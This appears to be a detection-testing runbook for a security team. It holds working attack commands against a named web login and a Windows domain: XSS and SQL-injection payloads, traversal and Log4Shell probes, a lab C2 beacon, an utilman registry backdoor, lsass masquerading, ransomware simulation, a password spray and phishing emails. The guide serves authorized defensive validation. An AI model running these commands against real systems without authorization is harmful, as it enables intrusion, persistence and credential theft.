# TDA Final Testing Guide — Line by Line (No Downloads)

Windows box, **admin**, Halcyon blocks downloads → **built-in tools + browser only**.
Run in **PowerShell as Administrator**, one command at a time. Each command has a
one-line explanation so you can run it and explain it to the team.

> A Halcyon/WAF **block = detection = PASS** (screenshot it). A gap = it runs and
> nothing logs/alerts. Note UTC time + source IP per test. Authorized scope only.
> Web target: `https://hcms.aaagroup.com` (login → `/M/Home/Authenticate`, field `userName`).

---

# 0. SETUP (run once)

**Command 1**
```powershell
auditpol /set /subcategory:"Process Creation" /success:enable
```
Turns on Windows process-creation logging (Event 4688) so the SIEM can see host tests.

**Command 2**
```powershell
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
```
Makes PowerShell use modern TLS so it can connect to HTTPS sites (web tests).

**Command 3**
```powershell
Get-Date -Format "yyyy-MM-dd HH:mm:ss" ; hostname ; ipconfig | findstr IPv4
```
Prints time + hostname + your IP — your marker for finding events in Splunk.

---

# 1. WEB — XSS (UC0229)

## 1a. Manual test — type these in the Username box (browser)
The username reflects into the input's `value="..."`, with `maxlength="25"` (client-side
only). Type a payload in the **Username** field, put anything in **Password**, click
**Log in**, and watch for an alert popup or the payload rendering in the error area.

| # | Payload (paste in Username) | Why it's shaped this way | Chars |
|---|---|---|---|
| 1 | `"><svg onload=alert(1)>` | **Best first try** — `">` escapes the double-quoted `value`, `<svg onload>` runs JS | 23 ✅ |
| 2 | `'><svg onload=alert(1)>` | same, if the value uses **single** quotes | 23 ✅ |
| 3 | `"><img src=x onerror=alert(1)>` | fallback if `svg` is filtered (remove maxlength first) | 29 |
| 4 | `" onmouseover=alert(1) x="` | stays **inside** the attribute — fires when you hover the field | 25 ✅ |
| 5 | `"autofocus onfocus=alert(1)>` | auto-fires on page load (no interaction) — remove maxlength | 27 |
| 6 | `<svg onload=alert(1)>` | if it reflects as **plain text** (e.g. in the error message), not an attribute | 21 ✅ |
| 7 | `"><script>alert(1)</script>` | classic (often blocked / won't run) — remove maxlength | 27 |

> To use payloads longer than 25 chars: in DevTools, click the `txtUsername` input →
> delete `maxlength="25"` → then paste the longer payload.

**Result:** alert popup or the `<svg>`/`<img>` renders = reflected XSS (vuln). Plain
text showing the characters = escaped (safe). WAF block page = detection caught it.

## 1b. PowerShell test (sends it for you; bypasses maxlength; good for WAF detection)

**Command 1 — marker test (find how input reflects)**
```powershell
$r = Invoke-WebRequest "https://hcms.aaagroup.com/M/Home/Authenticate" -Method POST -Body @{userName='xsstest123';password='x'} -UseBasicParsing; $r.Content | Select-String 'xsstest123'
```
Submits a harmless marker and shows how it comes back (inside `value="..."`, `value='...'`, or plain text) — this decides which payload to use.

**Command 2 — send the XSS payload**
```powershell
Invoke-WebRequest "https://hcms.aaagroup.com/M/Home/Authenticate" -Method POST -Body @{userName='"><svg onload=alert(1)>';password='x'} -UseBasicParsing
```
Sends `"><svg onload=alert(1)>` as the username — `">` breaks out of the value attribute, `<svg onload>` runs JS. Tests reflected XSS.

**Command 3 — confirm if it reflected unescaped (real vuln)**
```powershell
(Invoke-WebRequest "https://hcms.aaagroup.com/M/Home/Authenticate" -Method POST -Body @{userName='"><svg onload=alert(1)>';password='x'} -UseBasicParsing).Content | Select-String 'svg onload=alert'
```
If it returns your payload **unescaped**, the app is vulnerable; if it shows `&lt;svg...`, it's escaped (safe).

---

# 2. WEB — SQL Injection (UC0228)

**Command 1 — login bypass attempt**
```powershell
Invoke-WebRequest "https://hcms.aaagroup.com/M/Home/Authenticate" -Method POST -Body @{userName="admin' OR '1'='1";password="x"} -UseBasicParsing
```
Sends `admin' OR '1'='1` — a classic always-true SQL condition to bypass login. Tests SQLi detection.

**Command 2 — comment-based bypass**
```powershell
Invoke-WebRequest "https://hcms.aaagroup.com/M/Home/Authenticate" -Method POST -Body @{userName="admin'--";password="x"} -UseBasicParsing
```
`admin'--` comments out the password check in the query.

**Command 3 — error-based check (does it leak a SQL error?)**
```powershell
(Invoke-WebRequest "https://hcms.aaagroup.com/M/Home/Authenticate" -Method POST -Body @{userName="admin'";password="x"} -UseBasicParsing).Content | Select-String "SQL|syntax|ODBC|OLE DB|unclosed"
```
A single quote often breaks the query — if a SQL error appears in the response, it's likely injectable.

---

# 3. WEB — Other Exploits (UC0229)

**Command 1 — XSS in URL**
```powershell
Invoke-WebRequest "https://hcms.aaagroup.com/?q=<script>alert(1)</script>" -UseBasicParsing -TimeoutSec 8
```
Sends a `<script>` pattern in the URL — tests WAF XSS detection on GET parameters.

**Command 2 — path traversal (Windows)**
```powershell
Invoke-WebRequest "https://hcms.aaagroup.com/?file=../../../../windows/win.ini" -UseBasicParsing -TimeoutSec 8
```
Climbs folders to read a Windows system file — tests path-traversal/LFI detection.

**Command 3 — path traversal (Linux)**
```powershell
Invoke-WebRequest "https://hcms.aaagroup.com/?file=../../../../etc/passwd" -UseBasicParsing -TimeoutSec 8
```
Same for a Linux backend — tries to read `/etc/passwd`.

**Command 4 — command injection**
```powershell
Invoke-WebRequest "https://hcms.aaagroup.com/?cmd=;whoami" -UseBasicParsing -TimeoutSec 8
```
`;whoami` tries to run an OS command on the server — tests command-injection detection.

**Command 5 — Log4j probe**
```powershell
Invoke-WebRequest 'https://hcms.aaagroup.com/?x=${jndi:ldap://127.0.0.1/a}' -UseBasicParsing -TimeoutSec 8
```
Sends the Log4Shell `${jndi:...}` string — tests the Log4j signature. (Single quotes so `$` isn't treated as a variable.)

**Command 6 — SSTI (template injection)**
```powershell
Invoke-WebRequest "https://hcms.aaagroup.com/?tpl={{7*7}}" -UseBasicParsing -TimeoutSec 8
```
`{{7*7}}` tests if the server evaluates templates (a `49` in the response = vulnerable).

**Command 7 — open redirect**
```powershell
Invoke-WebRequest "https://hcms.aaagroup.com/?next=//evil.example.com" -UseBasicParsing -TimeoutSec 8
```
Tries to redirect the site to an external domain — tests open-redirect detection.

**Validate all web tests (Splunk / WAF):**
```spl
index=* dest="hcms.aaagroup.com" src="<YOUR_IP>" earliest=-20m | table _time src uri_path uri_query status
```

---

# 4. UC0141 — C2 / Command-and-Control (self-hosted lab server)

You host a tiny HTTP "C2 server" on a **second Windows lab machine**, then beacon to
it from the test box. Built-in PowerShell — no download.

> **Why the firewall rule even though both are Windows on the same subnet?**
> Windows Defender Firewall **blocks unsolicited inbound connections by default** —
> this has nothing to do with the subnet. The beacon is an *inbound* connection to
> port 8080 on the server, so without the rule the server's own firewall silently
> drops it and no beacon arrives. Outbound (the beaconing machine) is allowed by
> default, so **only the listening/server machine needs the rule.**

## On the C2 SERVER machine (the 2nd Windows box)

**Command 1 — open the firewall for the listener port**
```powershell
New-NetFirewallRule -DisplayName "TDA-C2" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
```
Allows inbound traffic on port 8080 so the beacon can reach your server (Windows blocks it otherwise, same subnet or not).

**Command 2 — start the HTTP listener (leave this window running)**
```powershell
$l=New-Object System.Net.HttpListener; $l.Prefixes.Add("http://+:8080/"); $l.Start(); Write-Host "C2 listening on 8080"; while($l.IsListening){ $c=$l.GetContext(); Write-Host "$(Get-Date) beacon from $($c.Request.RemoteEndPoint) $($c.Request.Url.AbsolutePath)"; $b=[Text.Encoding]::UTF8.GetBytes("ok"); $c.Response.OutputStream.Write($b,0,$b.Length); $c.Response.Close() }
```
Starts a web server on port 8080 that prints every incoming beacon and replies "ok". This is your fake C2. (Note this machine's IP with `ipconfig`.)

## On the TEST machine (the beaconing host)

**Command 3 — set the C2 address** (use the server's IP)
```powershell
$c2="http://<C2_SERVER_IP>:8080/beacon"
```
Points the beacon at your lab C2 server.

**Command 4 — beacon every 10 seconds, 30 times**
```powershell
1..30 | ForEach-Object { try { Invoke-WebRequest $c2 -UseBasicParsing -TimeoutSec 5 -Headers @{ "User-Agent"="beacon" } | Out-Null } catch {}; Start-Sleep -Seconds 10 }
```
Sends a small, regular request to the C2 — the repeating fixed-interval pattern is exactly what C2 detection flags. You'll see each beacon appear on the server window.

**Validate (firewall/proxy in Splunk):**
```spl
index=* src="<TEST_IP>" dest="<C2_SERVER_IP>" dest_port=8080 earliest=-15m | stats count by src dest
```
Many regular connections, same src→dest = C2 beacon pattern.

**Cleanup on the server:** close the listener window, then:
```powershell
Remove-NetFirewallRule -DisplayName "TDA-C2"
```

---

# 5. UC0036 — APT Process Creation (Masquerading)

**Command 1 — copy cmd.exe as a fake lsass.exe**
```powershell
Copy-Item C:\Windows\System32\cmd.exe C:\Windows\Temp\lsass.exe
```
Makes a disguised binary — `lsass.exe` in the wrong folder (attacker masquerading).

**Command 2 — run the fake process**
```powershell
Start-Process C:\Windows\Temp\lsass.exe
```
Launches the fake lsass — detection should flag lsass running from a non-System32 path.

**Command 3 — confirm**
```powershell
Get-Process lsass | Select Id,Path,StartTime
```
Shows the fake one with path `C:\Windows\Temp` next to the real System32 lsass.

**Command 4 — cleanup**
```powershell
Stop-Process -Name lsass -Force -EA SilentlyContinue; Remove-Item C:\Windows\Temp\lsass.exe -Force -EA SilentlyContinue
```
Kills the fake process and deletes it (never touches the real lsass).

---

# 6. UC0185 — Abuse of Accessibility Binaries (Sticky Keys / utilman)

**Command 1 — plant the backdoor (debugger on utilman)**
```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```
Tells Windows to launch cmd.exe when utilman runs — the accessibility backdoor. The registry write is the detection.

**Command 2 — confirm it persisted**
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger
```
Shows the Debugger line if set. "Not found" = Halcyon stripped it = prevention (also a PASS).

**Command 3 — trigger it**
```powershell
Start-Process C:\Windows\System32\utilman.exe
```
Runs utilman — if the key took, a cmd window pops instead (hijack fired).

**Command 4 — cleanup**
```powershell
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /f
```
Removes the backdoor key.

---

# 7. SPLUC0187 — Scheduled Task Spawning a Shell

**Command 1 — define the action**
```powershell
$a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami"
```
Prepares a task action that runs cmd.exe.

**Command 2 — create the task**
```powershell
Register-ScheduledTask -TaskName "uc0187test" -Action $a -Force
```
Creates the scheduled task on the machine.

**Command 3 — run it now**
```powershell
Start-ScheduledTask -TaskName "uc0187test"
```
Fires the task → Task Scheduler spawns cmd.exe (the detection).

**Command 4 — cleanup**
```powershell
Unregister-ScheduledTask -TaskName "uc0187test" -Confirm:$false
```
Removes the task.

---

# 8. UC0043 — Threat Activity (recon burst)

**Command 1**
```powershell
whoami /all; net user; net group "domain admins" /domain; systeminfo; tasklist; nltest /domain_trusts
```
Runs several attacker-style discovery commands quickly — a recon burst from one host.

---

# 9. UC0125 — Ransomware Extensions

**Command 1 — make a test folder**
```powershell
$dir="$env:TEMP\ransom"; New-Item -ItemType Directory -Force $dir | Out-Null
```
Creates a working folder in temp.

**Command 2 — list of ransomware extensions**
```powershell
$ext=".locky",".crypt",".encrypted",".wncry",".cerber",".zepto"
```
Known ransomware file extensions to use.

**Command 3 — create files and rename to those extensions**
```powershell
1..20 | ForEach-Object { $f="$dir\doc$_.txt"; "data" | Set-Content $f; Rename-Item $f "$dir\doc$_$($ext[$_ % $ext.Count])" }
```
Simulates ransomware encrypting (mass-renaming) files.

**Command 4 — drop a ransom note**
```powershell
"Your files are encrypted. Pay to recover." | Set-Content "$dir\READ_ME_DECRYPT.txt"
```
The classic ransom note left behind.

**Command 5 — cleanup**
```powershell
Remove-Item "$env:TEMP\ransom" -Recurse -Force
```
Deletes the test folder.

---

# 10. UC0032 — Critical Malware on EDR (EICAR)

**Command 1 — build the EICAR string**
```powershell
$e='X5O!P%@AP[4'+'\PZX54(P^)7CC)7}'+'$EICAR-STANDARD-'+'ANTIVIRUS-TEST-FILE!$H+H*'
```
The harmless industry-standard AV test string.

**Command 2 — write it to disk**
```powershell
Set-Content "$env:TEMP\eicar.com" -Value $e -Encoding Ascii
```
Creating the file triggers the AV/EDR.

**Command 3 — read it (force a scan)**
```powershell
Get-Content "$env:TEMP\eicar.com"
```
Opening it makes the engine inspect it.

**Command 4 — cleanup**
```powershell
Remove-Item "$env:TEMP\eicar.com" -Force -EA SilentlyContinue
```

---

# 11. UC0149 — Multiple AV Infections on Host

**Command 1 — build EICAR string**
```powershell
$e='X5O!P%@AP[4'+'\PZX54(P^)7CC)7}'+'$EICAR-STANDARD-'+'ANTIVIRUS-TEST-FILE!$H+H*'
```

**Command 2 — create 5 EICAR files**
```powershell
1..5 | ForEach-Object { Set-Content "$env:TEMP\eicar_$_.com" -Value $e -Encoding Ascii }
```
Multiple malware files = multiple detections on one host.

**Command 3 — read them all**
```powershell
Get-ChildItem "$env:TEMP\eicar_*.com" | ForEach-Object { Get-Content $_.FullName | Out-Null }
```

**Command 4 — cleanup**
```powershell
Remove-Item "$env:TEMP\eicar_*.com" -Force
```

---

# 12. NETWORK — Port Scans (from Kali/Zenmap, or PowerShell if nmap blocked)

**Horizontal (one port, many hosts) — nmap**
```bash
nmap -sS -Pn -n -p 445 172.16.75.0/24
```
Scans port 445 across the whole subnet — one source, many hosts (UC0053).

**Vertical (many ports, one host) — nmap**
```bash
nmap -sT -Pn -n -p 1-2000 10.77.20.20
```
Scans ports 1–2000 on one target — one source, many ports (UC0054).

**PowerShell vertical (no nmap, if blocked)**
```powershell
$ip="<TARGET>"; 1..1024 | ForEach-Object { $p=$_; $t=New-Object System.Net.Sockets.TcpClient; $c=$t.BeginConnect($ip,$p,$null,$null); if($c.AsyncWaitHandle.WaitOne(120)){"$ip:$p OPEN"; try{$t.EndConnect($c)}catch{}}; $t.Close() }
```
Native TCP scan of ports 1–1024 on one host — works where nmap is blocked by Halcyon.

**Prohibited port (UC0249)**
```powershell
$ip="<TARGET>"; 23,6667,4444 | ForEach-Object { (Test-NetConnection $ip -Port $_ -WarningAction SilentlyContinue) | Select RemoteAddress,RemotePort,TcpTestSucceeded }
```
Attempts connections to forbidden ports (telnet/IRC/4444) — tests prohibited-port detection.

---

# 13. UC0046 — Password Spray

**Command 1 — get a user list**
```powershell
(net user /domain) | Out-File "$env:TEMP\users.txt"
```
Saves domain usernames to a file.

**Command 2 — load the list**
```powershell
$users = Get-Content "$env:TEMP\users.txt" | Where-Object { $_ -match '^\S' }
```

**Command 3 — set one password**
```powershell
$pw = "Winter2026!"
```
One agreed password to spray (keep it one to avoid lockouts).

**Command 4 — spray it across all accounts**
```powershell
foreach ($u in $users) { cmd /c "net use \\<DC>\IPC$ /user:$u $pw" 2>$null; Start-Sleep -Milliseconds 300 }
```
Tries the one password against every account — generates many failed logons (Event 4625).

---

# 14. MAIL (needs SMTP relay + target mailbox)

**UC0222 — malicious attachment**
```powershell
Copy-Item C:\Windows\System32\calc.exe "$env:TEMP\invoice.exe"
```
Makes a risky-extension file (built-in, no download). Then:
```powershell
Send-MailMessage -From "tester@yourlab.local" -To "<victim@customer.com>" -Subject "Invoice" -Body "See attached" -Attachments "$env:TEMP\eicar.com","$env:TEMP\invoice.exe" -SmtpServer "<SMTP_SERVER>"
```
Emails EICAR + a `.exe` into the org — tests mail AV + extension blocking.

**SPLUC0107 — phishing email**
```powershell
Send-MailMessage -From "security-alert@micros0ft-support.com" -To "<victim@customer.com>" -Subject "URGENT: account suspended" -Body "Verify: http://<LAB_PHISH_HOST>/login" -SmtpServer "<SMTP_SERVER>"
```
Sends a phishing-style email (lookalike sender, urgency, bad link).

**UC0575 — multiple DLP violations**
```powershell
$dir="$env:TEMP\dlp"; New-Item -ItemType Directory -Force $dir | Out-Null; 1..5 | ForEach-Object { "Credit Card: 4111 1111 1111 1111`nSSN: 123-45-6789" | Set-Content "$dir\sensitive_$_.txt" }
```
Creates 5 fake-sensitive files. Then email each out through the DLP-monitored channel to trigger multiple violations.

---

# 15. CLOUD — Azure / M365 (browser, no download)

- **UC0458 Azure CRUD:** Portal → Resource groups → Create `tda-test-rg` → add tag → Delete. (create/update/delete in Activity Log)
- **UC0215 MFA Deny:** sign in to portal.office.com as test user → tap **Deny** on the MFA push.
- **UC0327 Privileged outside PIM:** Entra → Roles → assign a privileged role permanently (not via PIM) → do an admin action.
- **Password Spraying M365:** login.microsoftonline.com → one password across a few test accounts.
- **Malicious MFA Takeover:** spam push prompts (fatigue), or aka.ms/mfasetup → add a new MFA method.

---

# 16. UC0110 — Privilege Change on Firewall (on the firewall itself)
- Palo Alto: `set mgt-config users tdatest permissions role-based superuser yes` → `commit`
- Fortinet: `config system admin` → `edit tdatest` → `set accprofile super_admin` → `end`
Validate: firewall admin/audit logs show the privilege change.

---

## Per-test checklist
1. Note UTC time + source.  2. Announce to SOC.  3. Run the command(s).
4. Halcyon/WAF block → screenshot = PASS.  5. Pull events (adjust index/fields).
6. Record pass/gap.  7. Clean up.

*Built-in tools only. Use fake test data and lab-controlled hosts. Field names vary by data source.*
